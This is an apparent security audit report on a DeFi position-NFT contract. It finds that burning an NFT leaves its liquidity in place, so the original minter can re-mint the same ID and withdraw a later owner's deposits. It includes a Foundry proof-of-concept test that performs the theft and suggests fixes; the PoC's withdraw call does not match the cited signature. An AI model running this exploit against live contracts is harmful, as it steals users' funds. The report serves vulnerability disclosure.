## Title
NFT Burn/Re-mint Allows Original Minter to Steal Subsequent Owner's Position Liquidity

## Summary
The `burn()` function in `BaseNonfungibleToken.sol` does not verify that associated positions or orders are empty before allowing the NFT to be burned. Since NFT IDs are deterministically generated using `saltToId(minter, salt)`, the original minter can re-mint the same NFT ID by reusing the same salt, regaining control over positions that were funded by subsequent NFT owners after transfer.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `burn()` function is documented as a way to "refund some gas after the NFT is no longer needed" with the ability to recreate the same ID by reusing the salt. [2](#0-1) 

**Actual Logic:** The burn function only verifies the caller is authorized for the NFT but does NOT check whether there are active positions or orders associated with that NFT ID. When an NFT is burned, the position data in Core remains intact and is keyed by the Positions contract address and the positionId derived from the NFT ID. [3](#0-2) 

**Exploitation Path:**
1. **Alice mints NFT**: Alice calls `mint(salt)` which generates a deterministic ID based on `keccak256(Alice, salt, chainid, contract)`. [4](#0-3) 

2. **Alice deposits liquidity**: Alice deposits 100 tokens to a position using her NFT. The position is stored in Core at a location computed from the Positions contract address and the positionId (derived from NFT ID). [5](#0-4) 

3. **Alice transfers NFT to Bob**: Alice transfers/sells the NFT to Bob via standard ERC721 transfer.

4. **Bob adds more liquidity**: Bob deposits an additional 100 tokens to the same position (same NFT ID, same tick range, same pool). The position now holds 200 tokens total. [6](#0-5) 

5. **Bob burns the NFT**: Bob calls `burn(id)`, thinking he's done with the position or following misleading UI. The burn succeeds because Bob is the current owner, but the position data in Core is NOT cleaned up. [1](#0-0) 

6. **Alice re-mints same ID**: Alice calls `mint(salt)` with the same salt, regenerating the exact same NFT ID because `saltToId()` is deterministic. This is confirmed by the test showing "burn can be minted" with the same ID. [7](#0-6) 

7. **Alice withdraws all funds**: Alice calls `withdraw(id, poolKey, tickLower, tickUpper, liquidityAmount)`. The function checks `authorizedForNft(id)` which passes because Alice owns the re-minted NFT. Alice withdraws all 200 tokens, stealing Bob's 100 tokens. [8](#0-7) 

**Security Property Broken:** This violates the **Withdrawal Availability** invariant - Bob's positions should be withdrawable by him at any time, but after burning the NFT, his funds become inaccessible to him and accessible to the original minter.

## Impact Explanation
- **Affected Assets**: All liquidity positions (token0/token1 pairs) and TWAMM orders associated with burned NFTs where the original minter differs from the burner.
- **Damage Severity**: Complete loss of funds for the NFT owner who burns. The original minter can steal 100% of the liquidity deposited by subsequent owners. For example, if Bob deposits $1M in liquidity after buying the NFT from Alice, and then burns the NFT, Alice can steal the entire $1M.
- **User Impact**: Any user who purchases/receives a Position or Order NFT and later burns it without fully withdrawing loses all their deposited liquidity. This affects NFT marketplace buyers, gift recipients, and users following any UI that suggests burning "empty" NFTs.

## Likelihood Explanation
- **Attacker Profile**: The original minter of any Position or Order NFT. This could be any user who initially created an NFT and later transferred/sold it.
- **Preconditions**: 
  1. Attacker mints an NFT and deposits initial liquidity
  2. Attacker transfers NFT to victim (sale, gift, etc.)
  3. Victim deposits additional liquidity to existing position
  4. Victim burns the NFT without fully withdrawing
- **Execution Complexity**: Simple - just requires the attacker to call `mint(salt)` with the original salt after the victim burns, then call `withdraw()`.
- **Frequency**: Can be exploited once per NFT that gets burned. With a thriving NFT marketplace for positions, this could affect many users.

## Recommendation

The `burn()` function should verify that all positions and orders associated with the NFT are empty before allowing the burn. Here's the recommended fix:

```solidity
// In src/base/BasePositions.sol, add a new function:

/// @notice Check if an NFT has any active positions
/// @dev Should be called before burning to prevent loss of funds
/// @param id The NFT token ID to check
/// @return hasActivePositions True if any positions exist with non-zero liquidity
function hasActivePositions(uint256 id) public view returns (bool hasActivePositions) {
    // This would need to iterate through known pools or maintain a registry
    // Alternative: require explicit withdrawal of all positions before burn
    revert("Not implemented - positions must be manually verified");
}

// In src/base/BaseNonfungibleToken.sol, modify burn():

function burn(uint256 id) external payable authorizedForNft(id) {
    // For BasePositions: verify no active positions
    // For Orders: verify no active orders
    // This should be implemented in the child contracts
    _beforeBurn(id); // Hook for child contracts to implement checks
    _burn(id);
}

// Add virtual hook
function _beforeBurn(uint256 id) internal virtual {
    // Child contracts should override to check for active positions/orders
}
```

**Alternative mitigation**: Document clearly that users MUST withdraw all liquidity before burning, and implement UI safeguards that prevent burning NFTs with active positions. However, this is insufficient as it relies on user behavior.

**Better solution**: Make re-minting impossible by including a nonce in the ID generation:
```solidity
mapping(uint256 => bool) public burnedIds;

function burn(uint256 id) external payable authorizedForNft(id) {
    burnedIds[id] = true; // Mark as burned forever
    _burn(id);
}

function mint(bytes32 salt) public payable returns (uint256 id) {
    id = saltToId(msg.sender, salt);
    require(!burnedIds[id], "ID was previously burned");
    _mint(msg.sender, id);
}
```

## Proof of Concept

```solidity
// File: test/Exploit_BurnRemintTheft.t.sol
// Run with: forge test --match-test test_BurnRemintTheft -vvv

pragma solidity ^0.8.31;

import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {CallPoints} from "../src/types/callPoints.sol";

contract Exploit_BurnRemintTheft is FullTest {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    function setUp() public override {
        super.setUp();
        
        // Give Alice and Bob tokens
        token0.transfer(alice, 1000);
        token1.transfer(alice, 1000);
        token0.transfer(bob, 1000);
        token1.transfer(bob, 1000);
    }
    
    function test_BurnRemintTheft() public {
        // Create a pool
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, 
            CallPoints(false, false, false, false, false, false, false, false));
        
        // STEP 1: Alice mints NFT with specific salt
        vm.startPrank(alice);
        token0.approve(address(positions), 100);
        token1.approve(address(positions), 100);
        bytes32 salt = bytes32(uint256(12345)); // Alice's chosen salt
        (uint256 aliceId,,,) = positions.mintAndDepositWithSalt(
            salt, poolKey, -100, 100, 100, 100, 0
        );
        vm.stopPrank();
        
        // STEP 2: Alice transfers NFT to Bob
        vm.prank(alice);
        positions.transferFrom(alice, bob, aliceId);
        
        // Verify Bob owns the NFT
        assertEq(positions.ownerOf(aliceId), bob);
        
        // STEP 3: Bob deposits MORE liquidity to the same position
        vm.startPrank(bob);
        token0.approve(address(positions), 100);
        token1.approve(address(positions), 100);
        (uint128 bobLiquidity,,) = positions.deposit(
            aliceId, poolKey, -100, 100, 100, 100, 0
        );
        vm.stopPrank();
        
        // Verify position now has combined liquidity
        (uint128 totalLiquidity,,,,) = positions.getPositionFeesAndLiquidity(
            aliceId, poolKey, -100, 100
        );
        assertGt(totalLiquidity, bobLiquidity, "Should have Alice's + Bob's liquidity");
        
        // STEP 4: Bob burns the NFT (thinking he's done)
        vm.prank(bob);
        positions.burn(aliceId);
        
        // STEP 5: Alice re-mints with the SAME salt
        vm.prank(alice);
        uint256 remintedId = positions.mint(salt);
        
        // VERIFY: Alice got the same ID back!
        assertEq(remintedId, aliceId, "Alice reminted the same ID");
        assertEq(positions.ownerOf(remintedId), alice, "Alice owns the reminted NFT");
        
        // STEP 6: Alice withdraws ALL liquidity (including Bob's!)
        uint256 aliceBalanceBefore = token0.balanceOf(alice);
        vm.prank(alice);
        (uint128 withdrawn0, uint128 withdrawn1) = positions.withdraw(
            remintedId, poolKey, -100, 100, totalLiquidity
        );
        
        // VERIFY: Alice successfully withdrew Bob's liquidity
        assertGt(withdrawn0, 0, "Alice withdrew token0");
        assertGt(withdrawn1, 0, "Alice withdrew token1");
        assertGt(token0.balanceOf(alice), aliceBalanceBefore, 
            "Alice's balance increased with Bob's funds");
        
        // Bob's funds are now stolen - he cannot recover them
        // The position is controlled by Alice through the reminted NFT
    }
}
```

**Notes:**
- This vulnerability affects both the `Positions` contract and the `Orders` contract, as both inherit from `BaseNonfungibleToken` with the same burn mechanism. [9](#0-8) [10](#0-9) 
- The position data persists in Core storage even after the NFT is burned because `updatePosition` only zeros the position when `liquidityNext == 0`, not when the NFT is burned. [11](#0-10) 
- The vulnerability is particularly dangerous because the burn function's documentation suggests it's safe to use for "gas refunds" without mentioning the need to withdraw all positions first.

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L92-102)
```text
    function saltToId(address minter, bytes32 salt) public view returns (uint256 result) {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, minter)
            mstore(add(free, 32), salt)
            mstore(add(free, 64), chainid())
            mstore(add(free, 96), address())

            result := keccak256(free, 128)
        }
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L128-132)
```text
    /// @inheritdoc IBaseNonfungibleToken
    /// @dev Can be used to refund some gas after the NFT is no longer needed.
    ///      The same ID can be recreated by the original minter by reusing the salt.
    ///      Only the token owner or approved addresses can burn the token.
    ///      No fees are collected; any msg.value sent is ignored.
```

**File:** src/base/BaseNonfungibleToken.sol (L133-135)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
    }
```

**File:** src/libraries/CoreStorageLayout.sol (L100-114)
```text
    function poolPositionsSlot(PoolId poolId, address owner, PositionId positionId)
        internal
        pure
        returns (StorageSlot firstSlot)
    {
        assembly ("memory-safe") {
            let free := mload(0x40)
            mstore(free, positionId)
            mstore(add(free, 0x20), poolId)
            mstore(add(free, 0x40), owner)
            mstore(0, keccak256(free, 0x60))
            mstore(32, 1)
            firstSlot := keccak256(0, 64)
        }
    }
```

**File:** src/base/BasePositions.sol (L71-97)
```text
    function deposit(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);

        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }

        if (liquidity > uint128(type(int128).max)) {
            revert DepositOverflow();
        }

        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_DEPOSIT, msg.sender, id, poolKey, tickLower, tickUpper, liquidity)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L120-133)
```text
    function withdraw(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 liquidity,
        address recipient,
        bool withFees
    ) public payable authorizedForNft(id) returns (uint128 amount0, uint128 amount1) {
        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_WITHDRAW, id, poolKey, tickLower, tickUpper, liquidity, recipient, withFees)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L242-247)
```text

            PoolBalanceUpdate balanceUpdate = CORE.updatePosition(
                poolKey,
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
            );
```

**File:** test/Positions.t.sol (L421-426)
```text
    function test_burn_can_be_minted() public {
        uint256 id = positions.mint(bytes32(0));
        positions.burn(id);
        uint256 id2 = positions.mint(bytes32(0));
        assertEq(id, id2);
    }
```

**File:** src/Positions.sol (L13-13)
```text
contract Positions is BasePositions {
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/Core.sol (L430-438)
```text
            if (liquidityNext == 0) {
                position.liquidity = 0;
                position.feesPerLiquidityInsideLast = FeesPerLiquidity(0, 0);
            } else {
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
            }
```
